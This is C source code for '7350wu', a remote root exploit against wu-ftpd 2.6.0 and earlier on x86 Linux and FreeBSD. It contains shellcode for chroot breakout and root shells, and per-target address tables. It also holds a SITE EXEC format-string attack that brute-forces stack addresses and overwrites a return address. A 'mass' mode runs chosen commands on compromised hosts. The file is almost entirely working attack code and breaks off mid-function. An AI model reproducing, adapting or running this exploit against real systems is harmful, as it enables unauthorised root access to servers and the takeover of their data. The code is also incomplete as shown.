/* 7350wu.c - wuftpd <= 2.6.0 x86/linux remote root exploit
 *
 * 2000/06/28 -sc. & z-.
 *
 * 2nd version, mass enabled, doh!
 * 3rd version, multiple architectures
 * 4th version, freebsd exploit
 * 5th version, merged in some small chunks of code -sc.
 *
 * based heavily on smilers comments, initial ideas from tf8's and lamagra's
 * work on this.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#if !defined(__FreeBSD__)
#  include <getopt.h>
#endif
#include "network.h"


char *	hostname = "localhost";
char *	username = "ftp";
char *	password = "mozilla@";
int	verbose = 0;

int	ftpsock = 0;
int	ftp_sleep = 2;



int			mass = 0;

int			xpb_quad = 0;
int			xpb_double = 0;
int			xpb_align = 0;
int			xp_refind = 0;

unsigned long int	xp_dstaddr = 0x0;
unsigned long int	xp_bufdist = 0x0;
unsigned long int	xp_bufaddr = 0x0;

unsigned long int	xp_retaddr = 0x0;
unsigned long int	xp_retloc = 0x0;


void			hi_list (void);
static void		usage (char *program);
int			esc_ok (unsigned long int addr);
void			xpad_cat (unsigned char *fabuf,
	unsigned long int addr);

int			ftp_getwlen (void);
void			ftp_exploit (void);
unsigned long int	ftp_findrl (unsigned long int retloc);
unsigned long int	ftp_finddaddr (void);
unsigned long int	ftp_findaddr (void);
unsigned long int	ftp_finddist (void);
int			ftp_login (void);
int			ftp_vuln (void);
void			ftp_recv_until (int sock, char *buff, int len,
	char *begin);
void			shell (int sock);
void			hexdump (unsigned char *cbegin, unsigned int length);
static int	sc_build_x86_lnx (unsigned char *target, size_t target_len,
	unsigned char *shellcode, char **argv);


typedef struct {

	char *	target_os;
	char *	bytesex;

	/* XXX/FIXME: ugly stuff, assume padding for \xff, please fix that in
	 * case it bothers you
	 */
	int			ffpad;

	/* buffer distance search, assume the distance is at least
	 * bufdist_min, and at max bufdist_max
	 */
	unsigned long int	bufdist_min;
	unsigned long int	bufdist_max;

	/* where to start searching for the buffer address of the source
	 * (format string) buffer. it starts with the big addresses and
	 * searches towards the lower addresses
	 */
	unsigned long int	bufsaddr_start;
	unsigned long int	bufsaddr_end;

	/* the same for the destination buffer addresses
	 */
	unsigned long int	bufdaddr_start;
	unsigned long int	bufdaddr_end;

	/* where to start searching for the return address location.
	 * this is a midhit, so it will start at: bufdaddr_found + this + 0,
	 * and then will flip +4, -4, +8, -8.
	 *
	 * it will flip retloc_midhit times, then abort if not found
	 */
	unsigned long int	retloc_midhit;
	unsigned long int	retloc_maxsearch;

	/* the search for the return address location is based on the
	 * assumption that the *retloc is between this two addresses
	 */
	unsigned long int	retaddr_low;
	unsigned long int	retaddr_high;


	/* shellcode_read[strlen (shellcode_read)] has to hold the number
	 * of bytes to be read from the second shellcode.
	 */
	unsigned char *		shellcode_read;
	unsigned char *		shellcode_shell;

	/* some architectures provide the ability to execute stuff on
	 * the remote host to enable scripting, so if it does, un-NULL
	 * this two pointers, and off you go (with the "-c" option)
	 */
	unsigned char *		shellcode_execve;
	int			(* shellcode_execve_build)
		(unsigned char *target, size_t target_len,
		unsigned char *shellcode, char **argv);

} hostinfo;


/* BSD DATA
 * bsd stuff by smiler / teso
 */

/* escaped fbsd read() shellcode */
unsigned char x86_fbsd_read[] =
	"\x31\xc0\x6a\x00\x54\x50\x50\xb0\x03\xcd\x80\x83\xc4"
	"\x0c\xff\xff\xe4";

/* break chroot and exec /bin/sh - dont use on an unbreakable host like 4.0 */
unsigned char x86_fbsd_shell_chroot[] =
	"\x31\xc0\x50\x50\x50\xb0\x7e\xcd\x80"
	"\x31\xc0\x99"
	"\x6a\x68\x89\xe3\x50\x53\x53\xb0\x88\xcd"
	"\x80\x54\x6a\x3d\x58\xcd\x80\x66\x68\x2e\x2e\x88\x54"
	"\x24\x02\x89\xe3\x6a\x0c\x59\x89\xe3\x6a\x0c\x58\x53"
	"\x53\xcd\x80\xe2\xf7\x88\x54\x24\x01\x54\x6a\x3d\x58"
	"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x44\x68\x2f\x62\x69"
	"\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\x52\x51\x53\x53"
	"\x6a\x3b\x58\xcd\x80\x31\xc0\xfe\xc0\xcd\x80";

/* just exec /bin/sh */
unsigned char x86_fbsd_shell[] =
	"\x31\xc0\x99\x50\x50\x50\xb0\x7e\xcd\x80\x52\x68\x6e"
	"\x2f\x73\x68\x44\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89"
	"\xe2\x53\x89\xe1\x52\x51\x53\x53\x6a\x3b\x58\xcd\x80"
	"\x31\xc0\xfe\xc0\xcd\x80";

hostinfo	hi_freebsd_chroot = {
	"FreeBSD with breakable chroot",
	"little endian",

	4,
	1024,		1024 + 400,
	0xbfbff801,	0xbfbfaad8,
	0xbfbff201,	0xbfbfaad8,
	0x00000400,	0x00000008,
	0x08040000,	0x08060000,

	x86_fbsd_read,
	x86_fbsd_shell_chroot,

	NULL,
	NULL
};

hostinfo	hi_freebsd = {
	"FreeBSD",
	"little endian",

	4,
	1024,		1024 + 400,
	0xbfbff801,	0xbfbfaad8,
	0xbfbff201,	0xbfbfaad8,
	0x00000400,	0x00000008,
	0x08040000,	0x08060000,

	x86_fbsd_read,
	x86_fbsd_shell,

	NULL,
	NULL
};

/* LINUX DATA
 */


/* 15 byte x86/linux PIC read() shellcode by lorian / teso
 *
 * escaped for this purpose it's 16 bytes, the \x00 byte has to be overwritten
 * with the number of bytes we want to read, hence the maximum value is \xff,
 * but we can't use that, so we use \xfe instead, woah ! :-)
 * thanks lorian, cool stuff that is :-)
 */
unsigned char	x86_lnx_read[] =
	"\x33\xdb"		/* xorl	%ebx, %ebx	*/
	"\xf7\xe3"		/* mull	%ebx		*/
	"\xb0\x03"		/* movb $3, %al		*/
	"\x8b\xcc"		/* movl	%esp, %ecx	*/
	"\x68\xb2\x00\xcd\x80"	/* push 0x80CDxxB2	*/
	"\xff\xff\xe4";		/* jmp	%esp		*/


/* Lam3rZ code =)
 *
 * setuid/chroot-break/execve
 */
unsigned char	x86_lnx_shell[] =
	"\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0"
	"\x31\xdb\x43\x89\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b"
	"\x5e\x31\xc0\x31\xc9\x8d\x5e\x01\x88\x46\x04\x66"
	"\xb9\xff\x01\xb0\x27\xcd\x80\x31\xc0\x8d\x5e\x01"
	"\xb0\x3d\xcd\x80\x31\xc0\x31\xdb\x8d\x5e\x08\x89"
	"\x43\x02\x31\xc9\xfe\xc9\x31\xc0\x8d\x5e\x08\xb0"
	"\x0c\xcd\x80\xfe\xc9\x75\xf3\x31\xc0\x88\x46\x09"
	"\x8d\x5e\x08\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30\xfe"
	"\xc8\x88\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08"
	"\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0"
	"\x0b\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80\xe8"
	"\x90\xff\xff\xff\x30\x62\x69\x6e\x30\x73\x68\x31"
	"\x2e\x2e\x31\x31";


/* 38 byte x86/linux PIC arbitrary execute shellcode - scut / teso
 * second smack, read from message body
 *
 * prepended with a setuid(0)/setgid(0)/chroot() break stub from
 * lorian, because on most linux systems we run in a chroot env
 * when being anonymous, so get rid of that
 */
unsigned char	x86_lnx_execve[] =
	/* 49 byte x86 linux PIC setreuid(0,0) + chroot-break
	 * code by lorian / teso
	 */
	"\x33\xdb\xf7\xe3\xb0\x46\x33\xc9\xcd\x80\x6a\x54"
	"\x8b\xdc\xb0\x27\xb1\xed\xcd\x80\xb0\x3d\xcd\x80"
	"\x52\xb1\x10\x68\xff\x2e\x2e\x2f\x44\xe2\xf8\x8b"
	"\xdc\xb0\x3d\xcd\x80\x58\x6a\x54\x6a\x28\x58\xcd"
	"\x80"

	/* execve
	 */
	"\xeb\x1f\x5f\x89\xfc\x66\xf7\xd4\x31\xc0\x8a\x07"
	"\x47\x57\xae\x75\xfd\x88\x67\xff\x48\x75\xf6\x5b"
	"\x53\x50\x5a\x89\xe1\xb0\x0b\xcd\x80\xe8\xdc\xff"
	"\xff\xff";


hostinfo 	hi_linux = {
	"Linux operating system",
	"little endian",

	7,
	1024,		1024 + 400,
	0xbfffe210,	0xbfffa010,
	0xbfffb3f0,	0xbfffa610,
	0x00002004,	0x00000008,
	0x08040000,	0x08060000,

	x86_lnx_read,
	x86_lnx_shell,

	x86_lnx_execve,
	sc_build_x86_lnx
};

hostinfo *	targets[] = {
	&hi_linux,
	&hi_freebsd,
	&hi_freebsd_chroot,
	NULL,
};

hostinfo *	tg = NULL;

unsigned char *	shellcode = NULL;
unsigned char *	shellcode2 = NULL;


void
hi_list (void)
{
	int	i;


	printf ("target  description                         byte order\n"
		"------  ----------------------------------  ------------------\n");

	for (i = 0 ; targets[i] != NULL ; ++i) {
		printf ("%6d  %-34s  %s\n",
			i + 1,
			targets[i]->target_os,
			targets[i]->bytesex);
	}

	printf ("\n");

	return;
}


static void
usage (char *program)
{
	printf ("usage: %s [options] [commands]\n\n"
		"options\n"
		"   -t target       choose target, -t 0 for a list (default: 1)\n"
		"   -c              enable mass mode, [commands] are required then\n"
		"                   don't use parameters in commands, or use the\n"
		"                   option end sign, as in: ... -c -- /bin/sh -c \"id\"\n"
		"   -h hostname     set target host/ip (default: \"%s\")\n"
		"   -u username     set username to use for login (default: \"%s\")\n"
		"   -p password     set password to use (default: \"%s\"\n"
		"   -s sleeptime    sleep between reconnects (default: %d seconds)\n"
		"   -r              refind the buffer distance on each connection\n"
		"   -v              verbose mode (two times -> insane verbosity)\n"
		"\n", program, hostname, username, password, ftp_sleep);

	exit (EXIT_FAILURE);
}


int
main (int argc, char *argv[])
{
	unsigned char	massbuf[256];
	int		flipcoin,
			n;
	char		c;


	printf ("7350wu - wuftpd <= 2.6.0 x86/linux remote root (mass enabled)\n"
		"by team teso\n\n");

	if (argc == 1)
		usage (argv[0]);

	tg = targets[0];

	while ((c = getopt (argc, argv, "t:ch:u:p:s:rv")) != EOF) {
		switch (c) {
		case 't':
			if (atoi (optarg) == 0) {
				hi_list ();

				exit (EXIT_SUCCESS);
			}

			{
				int	cc;

				tg = NULL;
				for (cc = 0 ; targets[cc] != NULL ; ++cc) {
					if (cc == (atoi (optarg) - 1))
						tg = targets[cc];
				}
				if (tg == NULL) {
					hi_list ();
					exit (EXIT_FAILURE);
				}
			}
			break;

		case 'c':
			mass = 1;
			break;
		case 'h':
			hostname = optarg;
			break;
		case 'u':
			username = optarg;
			break;
		case 'p':
			password = optarg;
			break;
		case 's':
			ftp_sleep = atoi (optarg);
			break;
		case 'r':
			xp_refind = 1;
			break;
		case 'v':
			verbose++;
			break;
		default:
			usage (argv[0]);
			break;
		}
	}

	/* one remaining argument (script file name)
	 */
	if (mass == 1 && (argc - optind) == 0)
		usage (argv[0]);

	if (mass == 1) {
		int	len;

		if (tg->shellcode_execve == NULL) {
			printf ("sorry your selected architecture \"%s\" has no\n"
				"mass capabilities in this exploit. aborting.\n",
				tg->target_os);

			exit (EXIT_FAILURE);
		}

		len = tg->shellcode_execve_build (massbuf, sizeof (massbuf),
			tg->shellcode_execve, &argv[optind]);

		if (len >= 0xff) {
			printf ("created shellcode too long\n");

			exit (EXIT_FAILURE);
		}

		shellcode2 = massbuf;

		printf ("phase 0 - created %d byte execve shellcode\n", len);
	} else {
		shellcode2 = tg->shellcode_shell;
	}

	printf ("phase 1 - login... ");
	fflush (stdout);
	ftpsock = ftp_login ();
	if (ftpsock <= 0) {
		printf ("failed\n");
		exit (EXIT_FAILURE);
	}
	printf ("login succeeded\n");

	printf ("phase 2 - testing for vulnerability... ");
	fflush (stdout);
	if (ftp_vuln () == 0) {
		printf ("not vulnerable, aborting.\n");
		exit (EXIT_FAILURE);
	}
	printf ("vulnerable, continuing\n");
	printf ("phase 3 - finding buffer distance on stack... ");
	fflush (stdout);
	xp_bufdist = ftp_finddist ();
	if (xp_bufdist == 0) {
		printf ("\n   failed\n");
		exit (EXIT_FAILURE);
	}
	printf ("\n  found: %lu (0x%08lx)\n", xp_bufdist, xp_bufdist);

	xpb_align = xp_bufdist % 4;
	xpb_quad = xp_bufdist / 8;
	xpb_double = (xp_bufdist % 8) / 4;
	if (verbose) {
		printf ("  q: %d    d: %d    a: %d\n\n",
			xpb_quad, xpb_double, xpb_align);
		printf ("  space required for pop buffer: %d bytes\n",
			(xpb_quad * 3) + (xpb_double * 2) + xpb_align);
	}

	printf ("phase 4 - finding source buffer address... ");
	fflush (stdout);
	xp_bufaddr = ftp_findaddr ();
	if (xp_bufaddr == 0) {
		printf ("failed\n");
		exit (EXIT_FAILURE);
	}
	printf ("\n  found: 0x%08lx\n", xp_bufaddr);

	printf ("phase 5 - find destination buffer address... ");
	fflush (stdout);
	xp_dstaddr = ftp_finddaddr ();
	if (xp_dstaddr == 0) {
		printf ("failed\n");
		exit (EXIT_FAILURE);
	}
	printf ("\n  found: 0x%08lx\n", xp_dstaddr);

	shellcode = tg->shellcode_read;
	shellcode[strlen (shellcode)] = (unsigned char) strlen (shellcode2);

	/* calculation is easy, we're at the end of the source buffer,
	 * so buf-addr + sizeof (buf), minus the actual shellcode length.
	 * then we've to subtract the escaped \xff characters count, which
	 * is assumed to be 4 in this case, but can vary upward to 8 or such,
	 * so we choose 7 here, just to be safe.
	 *
	 * XXX: warning, if you have lots of \xff bytes in here, then increase
	 *      ffpad to at least the number of \xff chars you have.
	 */
	xp_retaddr = xp_bufaddr + 511 - strlen (shellcode) - tg->ffpad;
	if (verbose > 1)
		printf ("xp_bufaddr = 0x%08lx\n"
			"strlen (shellcode) = %d\n"
			"return address = 0x%08lx - %d = 0x%08lx\n",
			xp_bufaddr, strlen (shellcode), xp_bufaddr, strlen (shellcode), xp_retaddr);

	printf ("phase 6 - calculating return address\n");
	printf ("  retaddr = 0x%08lx\n", xp_retaddr);


	printf ("phase 7 - getting return address location\n");

	flipcoin = 1;
	for (n = 0 ; n <= (tg->retloc_maxsearch * 4) ; ) {
		unsigned long int	content;

		if (verbose)
			printf ("%d\n", flipcoin * n);
		xp_retloc = xp_dstaddr + tg->retloc_midhit + (flipcoin * n);

		flipcoin = (flipcoin == 1) ? -1 : 1;
		if (flipcoin == -1)
			n += 4;

		if (esc_ok (xp_retloc) == 0) {
			if (verbose)
				printf ("skipping ill retloc 0x%08lx\n",
					xp_retloc);

			continue;
		}

		if (verbose)
			printf ("# 0x%08lx\n", xp_retloc);
		content = ftp_findrl (xp_retloc);
		if (verbose)
			printf ("0x%08lx @ 0x%08lx\n", content, xp_retloc);
		if (content >= tg->retaddr_low && content <= tg->retaddr_high)
			n = 0x7350;
	}
	printf ("  found 0x%08lx\n", xp_retloc);

	printf ("phase 8 - exploitation...\n");
	fflush (stdout);
	ftp_exploit ();

	exit (EXIT_SUCCESS);

}


/* actual exploitation function
 *
 * we use a buffer layout like this:
 *
 * sizes:
 *  12                  0-3        28               >414      28     x
 * [SITE EXEC 7<space>][alignment][retlocs/dummies][stackpop][write][shellcode]
 *
 * since we've 510 bytes to send, the shellcode has to be smaller then
 * 510 - 12 - 3 - 28 - 414 - 28 = 25 bytes. this is no problem for us.
 *
 * we use a old-glibc compatible per-byte write method, so we don't fuck with
 * the snprintf length parameter in the dummy alignment.
 *
 * it works like:
 * 1. pop the stack until we have the stack pointer pointing at the retlocs
 * 2. dummy align the written-bytes-counter to have the lsb == retaddr-lsb
 * 3. store that byte at the retloc using %n
 * 4. do the same for the lsb from the counter and store the remaining three
 *    bytes to retloc +1, +2, +3
 * 5. return to our exact shellcode location
 */

void
ftp_exploit (void)
{
	int		i,
			wlen,
			tow,
			rem;
	unsigned char	popstackbuf[512];
	unsigned char	sbuf[512];
	unsigned char	rbuf[512];
	unsigned char	retaddr[4];


	xpb_quad -= 1;
	xpb_double += 1;
	if (xpb_double >= 2) {
		xpb_quad += xpb_double / 2;
		xpb_double %= 2;
	}

	retaddr[0] = ((xp_retaddr & 0x000000ff)      );
	retaddr[1] = ((xp_retaddr & 0x0000ff00) >>  8);
	retaddr[2] = ((xp_retaddr & 0x00ff0000) >> 16);
	retaddr[3] = ((xp_retaddr & 0xff000000) >> 24);
	if (verbose)
		printf ("storing 0x%08lx as: \\x%02x\\x%02x\\x%02x\\x%02x\n",
			xp_retaddr, retaddr[0], retaddr[1], retaddr[2], retaddr[3]);

	wlen = ftp_getwlen ();
	wlen -= 4;

	memset (popstackbuf, '\x00', sizeof (popstackbuf));
	for (i = xpb_align; i > 0 ; --i)
		strcat (popstackbuf, "z");
	for (i = xpb_quad ; i > 0 ; --i)
		strcat (popstackbuf, "%.f");
	for (i = xpb_double ; i > 0 ; --i)
		strcat (popstackbuf, "%d");

	printf ("  using return address location: 0x%08lx\n",
		xp_retloc);

	memset (sbuf, '\x00', sizeof (sbuf));
	sprintf (sbuf, "SITE EXEC 7 ");
	xpad_cat (sbuf, xp_retloc);
	xpad_cat (sbuf, 0x73507350);
	xpad_cat (sbuf, xp_retloc + 1);
	xpad_cat (sbuf, 0x73507350);
	xpad_cat (sbuf, xp_retloc + 2);
	xpad_cat (sbuf, 0x73507350);
	xpad_cat (sbuf, xp_retloc + 3);
	strcat (sbuf, popstackbuf);

	/* create the paddings
	 */
	tow = ((retaddr[0] + 0x100) - (wlen % 0x100)) % 0x100;
	if (tow < 10) tow += 0x100;	
	if (verbose > 1)
		printf ("wlen = %d\ttow = %d\n", wlen, tow);
	sprintf (sbuf + strlen (sbuf), "%%%dd%%n", tow);
	wlen += tow;

	tow = ((retaddr[1] + 0x100) - (wlen % 0x100)) % 0x100;
	if (tow < 10) tow += 0x100;
	if (verbose > 1)
		printf ("wlen = %d\ttow = %d\n", wlen, tow);
	sprintf (sbuf + strlen (sbuf), "%%%dd%%n", tow);
	wlen += tow;

	tow = ((retaddr[2] + 0x100) - (wlen % 0x100)) % 0x100;
	if (tow < 10) tow += 0x100;
	if (verbose > 1)
		printf ("wlen = %d\ttow = %d\n", wlen, tow);
	sprintf (sbuf + strlen (sbuf), "%%%dd%%n", tow);
	wlen += tow;

	tow = ((retaddr[3] + 0x100) - (wlen % 0x100)) % 0x100;
	if (tow < 10) tow += 0x100;
	if (verbose > 1)
		printf ("wlen = %d\ttow = %d\n", wlen, tow);
	sprintf (sbuf + strlen (sbuf), "%%%dd%%n", tow);
	wlen += tow;

	rem = 510 - strlen (sbuf);
	if (rem < strlen (shellcode)) {
		printf ("failed, no room to store shellcode in %d bytes\n", rem);
		exit (EXIT_FAILURE);
	}
	if (strlen (shellcode2) >= 0xff) {
		printf ("failed, the second shellcode is too long to be read (%d bytes)\n",
			strlen (shellcode2));
		exit (EXIT_FAILURE);
	}

	if (verbose) {
		printf ("/* using read() shellcode */\n");

		hexdump (shellcode, strlen (shellcode));
	}

	for (i = rem - strlen (shellcode) ; i > 0 ; --i)
		strcat (sbuf, "\x90");
	strcat (sbuf, shellcode);

//	if (verbose)
		printf ("len = %d\n", strlen (sbuf));

	net_write (ftpsock, "%s\n", sbuf);
	net_rlinet (ftpsock, rbuf, sizeof (rbuf) - 1, 20);
	sleep (1);
	net_write (ftpsock, "%s\n", shellcode2);
	sleep (2);

	if (mass == 1) {
		sleep (10);

		printf ("exploitation attempt finished\n");
		exit (EXIT_SUCCESS);
	}
	net_write (ftpsock, "id;\n");
	shell (ftpsock);

#if 1
	memset (rbuf, '\x00', sizeof (rbuf));
	if (net_rlinet (ftpsock, rbuf, sizeof (rbuf) - 1, 20) <= 0) {
		if (verbose)
			printf ("remote closed connection (most likely crashed)\n");
	} else {
		if (verbose > 1)
			printf ("\nreceived: %s\n", rbuf);

		if (memcmp (rbuf, "uid=", 4) == 0) {
			printf ("spawning rootshell:\n");
			shell (ftpsock);
		} else {
			printf ("exploitation failed\n");
			exit (EXIT_FAILURE);
		}
	}
#endif

	return;
}


int
ftp_getwlen (void)
{
	unsigned char *	sn;
	int		owlen,
			i;
	unsigned char	popstackbuf[512];
	unsigned char	sbuf[512];
	unsigned char	rbuf[2048];


	memset (popstackbuf, '\x00', sizeof (popstackbuf));
	for (i = xpb_align; i > 0 ; --i)
		strcat (popstackbuf, "z");
	for (i = xpb_quad ; i > 0 ; --i)
		strcat (popstackbuf, "%.f");
	for (i = xpb_double ; i > 0 ; --i)
		strcat (popstackbuf, "%d");

	memset (sbuf, '\x00', sizeof (sbuf));
	sprintf (sbuf, "SITE EXEC 7 ");
	xpad_cat (sbuf, 0x41414141);
	xpad_cat (sbuf, 0x73507350);
	xpad_cat (sbuf, 0x41414142);
	xpad_cat (sbuf, 0x73507350);
	xpad_cat (sbuf, 0x41414143);
	xpad_cat (sbuf, 0x73507350);
	xpad_cat (sbuf, 0x41414144);
	strcat (sbuf, popstackbuf);

	strcat (sbuf, "|%p|%p|%p|%p|%p|");

	net_write (ftpsock, "%s\n", sbuf);

	memset (rbuf, '\x00', sizeof (rbuf));
	if (net_rlinet (ftpsock, rbuf, sizeof (rbuf) - 1, 20) <= 0) {
		printf ("failed, remote closed connection\n");
		exit (EXIT_FAILURE);
	}
	ftp_recv_until (ftpsock, NULL, 0, "200 ");

	if (verbose > 1)
		printf ("\nreceived trace: %s\n", rbuf);

	if (strstr (rbuf, "|0x73507350|") == NULL ||
		strchr (rbuf, '|') == NULL)
	{
		printf ("exploitation failed, misalignment.\n");

		exit (EXIT_FAILURE);
	}

	sn = strchr (rbuf, '|');
	owlen = sn - rbuf;
	if (verbose)
		printf ("written so far on first smack: %d (%02x)\n", owlen,
			owlen % 0xff);

	return (owlen);
}


int
esc_ok (unsigned long int addr)
{
	if (	(((addr & 0x000000ff)     ) == '%') ||
		(((addr & 0x0000ff00) >> 8) == '%') ||
		(((addr & 0x00ff0000) >> 16) == '%') ||
		(((addr & 0xff000000) >> 24) == '%') ||
		(((addr & 0x000000ff)     ) == '\x0a') ||
		(((addr & 0x0000ff00) >> 8) == '\x0a') ||
		(((addr & 0x00ff0000) >> 16) == '\x0a') ||
		(((addr & 0xff000000) >> 24) == '\x0a') ||
		(((addr & 0x000000ff)     ) == '\x00') ||
		(((addr & 0x0000ff00) >> 8) == '\x00') ||
		(((addr & 0x00ff0000) >> 16) == '\x00') ||
		(((addr & 0xff000000) >> 24) == '\x00'))
	{
		return (0);
	}

	return (1);
}


unsigned long int
ftp_findrl (unsigned long int retloc)
{
	int		i;
	unsigned char *	sn;
	unsigned char	popstackbuf[512];
	unsigned char	sbuf[512];
	unsigned char	rbuf[2048];


	memset (popstackbuf, '\x00', sizeof (popstackbuf));
	for (i = xpb_align; i > 0 ; --i)
		strcat (popstackbuf, "z");
	for (i = xpb_quad ; i > 0 ; --i)
		strcat (popstackbuf, "%.f");
	for (i = xpb_double ; i > 0 ; --i)
		strcat (popstackbuf, "%d");

	memset (sbuf, '\x00', sizeof (sbuf));
	sprintf (sbuf, "SITE EXEC 7 ");

	xpad_cat (sbuf, retloc);
	strcat (sbuf, popstackbuf);

	strcat (sbuf, "|%.4s|");

	net_write (ftpsock, "%s\n", sbuf);

	memset (rbuf, '\x00', sizeof (rbuf));
	if (net_rlinet (ftpsock, rbuf, sizeof (rbuf) - 1, 20) <= 0) {
		printf ("failed, remote closed connection\n");
		exit (EXIT_FAILURE);
	}
	ftp_recv_until (ftpsock, NULL, 0, "200 ");

	sn = strchr (rbuf, '|');
	if (sn == NULL)
		return (0);

	sn++;
	if (verbose)
		printf ("\nRL = %08lx\n", *((unsigned long int *) sn));

	if (sn[0] == '|' || sn[1] == '|' || sn[2] == '|' || sn[3] == '|')
		return (0);
	return (*((unsigned long int *) sn));
}


unsigned long int
ftp_finddaddr (void)
{
	int			i,
				n = 0,
				blipcount,
				ssiz,
				tend;
	unsigned long int	addr;
	unsigned char		popstackbuf[512];
	unsigned char		fabuf[512];
	unsigned char		sbuf[1024];
	unsigned char		rbuf[1024];
	unsigned char *		figure;


	for (addr = tg->bufdaddr_start ; addr > tg->bufdaddr_end ;
		addr -= ssiz)
	{

		/* 1. build pop stack buffer
		 */
		memset (popstackbuf, '\x00', sizeof (popstackbuf));
		for (i = xpb_align; i > 0 ; --i)
			strcat (popstackbuf, "z");
		for (i = xpb_quad ; i > 0 ; --i)
			strcat (popstackbuf, "%.f");
		for (i = xpb_double ; i > 0 ; --i)
			strcat (popstackbuf, "%d");

		if (esc_ok (addr) == 0) {
			if (verbose)
				printf ("skipping ill address 0x%08lx\n", addr);
			continue;
		} else if (verbose) {
			printf ("using sane address 0x%08lx, pad %d\n", addr, n);
		}

		/* 2. build write buffer
		 */
		memset (fabuf, '\x00', sizeof (fabuf));

		xpad_cat (fabuf, addr);
		sprintf (fabuf + strlen (fabuf), "%s", popstackbuf);

		sprintf (sbuf, "SITE EXEC 7 %s", fabuf);
		ssiz = 500 - strlen (sbuf);
		for (i = ssiz, blipcount = 0 ; i > 0 ; --i, blipcount++)
			strcat (sbuf, "_");
		sprintf (sbuf + strlen (sbuf), "%%%%|x|%%.%ds", ssiz);	/* XXX: thx smiler */
		ssiz -= 16;

		if (verbose && addr == tg->bufdaddr_start) {
			printf ("\nbuffer length = %d\n", strlen (sbuf));
			printf ("brute step length = %d\n", ssiz);
		}

		if (verbose > 1)
			printf ("%s\n", sbuf);

		net_write (ftpsock, "%s\n", sbuf);

		memset (rbuf, '\x00', sizeof (rbuf));

		if (net_rlinet (ftpsock, rbuf, sizeof (rbuf) - 1, 8) <= 0) {
			printf ("remote closed connection, reconnecting\n");
			close (ftpsock);
			if (ftp_sleep != 0)
				sleep (ftp_sleep);
			ftpsock = ftp_login ();
			if (ftpsock <= 0) {
				printf ("relogin failed\n");
				exit (EXIT_FAILURE);
			}
			if (xp_refind) {
				xp_bufdist = ftp_finddist ();
				if (xp_bufdist == 0) {
					printf ("refinding of bufdist failed\n");
					exit (EXIT_FAILURE);
				}
				printf ("refound: %lu (0x%08lx)\n", xp_bufdist, xp_bufdist);

				xpb_align = xp_bufdist % 4;
				xpb_quad = xp_bufdist / 8;
				xpb_double = (xp_bufdist % 8) / 4;
			}
		} else {
			ftp_recv_until (ftpsock, NULL, 0, "200 ");
		}
		printf ("#");
		fflush (stdout);

		/* now we try to figure whether we hit our space
		 */
		if (verbose > 1)
			printf ("%s\n", rbuf);

		figure = strstr (rbuf, "_%|x|");
		if (figure == NULL)
			continue;
		tend = figure - rbuf;
		figure += 5;

		if (*figure != '_' || strstr (figure, "_%|x|") == NULL)
			continue;

		for (n = 0 ; *figure == '_' ; ++figure, ++n)
			;

		if (verbose) {
			printf ("hit at 0x%08lx: %s\n", addr - (blipcount - n), figure - n);
			if (verbose > 1)
				printf ("%s\n", rbuf);
		}

		xp_dstaddr = addr + n - tend - 1;
		if (verbose)
			printf ("buffer is located at: 0x%08lx\n", xp_dstaddr);

		return (xp_dstaddr);
	}

	return (0);
}



unsigned long int
ftp_findaddr (void)
{
	int			i,
				n = 0,
				blipcount,
				ssiz,
				tend;
	unsigned long int	addr;
	unsigned char		popstackbuf[512];
	unsigned char		fabuf[512];
	unsigned char		sbuf[1024];
	unsigned char		rbuf[1024];
	unsigned char *		figure;


	for (addr = tg->bufsaddr_start ; addr > tg->bufsaddr_end ; addr -= ssiz) {

		/* 1. build pop stack buffer
		 */
		memset (popstackbuf, '\x00', sizeof (popstackbuf));
		for (i = xpb_align; i > 0 ; --i)
			strcat (popstackbuf, "z");
		for (i = xpb_quad ; i > 0 ; --i)
			strcat (popstackbuf, "%.f");
		for (i = xpb_double ; i > 0 ; --i)
			strcat (popstackbuf, "%d");

		if (esc_ok (addr) == 0) {
			if (verbose)
				printf ("skipping ill address 0x%08lx\n", addr);
			continue;
		} else if (verbose) {
			printf ("using sane address 0x%08lx, pad %d\n", addr, n);
		}

		/* 2. build write buffer
		 */
		memset (fabuf, '\x00', sizeof (fabuf));

		xpad_cat (fabuf, addr);
		sprintf (fabuf + strlen (fabuf), "%s", popstackbuf);

		sprintf (sbuf, "SITE EXEC 7 %s", fabuf);
		ssiz = (508 - 4) - strlen (sbuf);
		for (i = ssiz - 4, blipcount = 0 ; i > 0 ; --i, blipcount++)
			strcat (sbuf, "_");
		tend = strlen (sbuf);
		ssiz -= 4;
		sprintf (sbuf + strlen (sbuf), "%%%%|x|%%.%ds", ssiz);	/* XXX: thx smiler */

		if (verbose && addr == tg->bufsaddr_start) {
			printf ("\nbuffer length = %d\n", strlen (sbuf));
			printf ("brute step length = %d\n", ssiz);
		}

		if (verbose > 1)
			printf ("%s\n", sbuf);

		net_write (ftpsock, "%s\n", sbuf);

		memset (rbuf, '\x00', sizeof (rbuf));

		if (net_rlinet (ftpsock, rbuf, sizeof (rbuf) - 1, 8) <= 0) {
			printf ("remote closed connection, reconnecting\n");
			close (ftpsock);
			if (ftp_sleep != 0)
				sleep (ftp_sleep);
			ftpsock = ftp_login ();
			if (ftpsock <= 0) {
				printf ("relogin failed\n");
				exit (EXIT_FAILURE);
			}
			if (xp_refind) {
				xp_bufdist = ftp_finddist ();
				if (xp_bufdist == 0) {
					printf ("refinding of bufdist failed\n");
					exit (EXIT_FAILURE);
				}
				printf ("refound: %lu (0x%08lx)\n", xp_bufdist, xp_bufdist);

				xpb_align = xp_bufdist % 4;
				xpb_quad = xp_bufdist / 8;
				xpb_double = (xp_bufdist % 8) / 4;
			}
		} else {
			ftp_recv_until (ftpsock, NULL, 0, "200 ");
		}
		printf ("#");
		fflush (stdout);

		/* now we try to figure whether we hit our space
		 */
		if (verbose > 1)
			printf ("%s\n", rbuf);

		figure = strstr (rbuf, "_%|x|");
		if (figure == NULL)
			continue;
		figure += 5;

		if (*figure != '_')
			continue;

		for (n = 0 ; *figure == '_' ; ++figure, ++n)
			;

		if (verbose) {
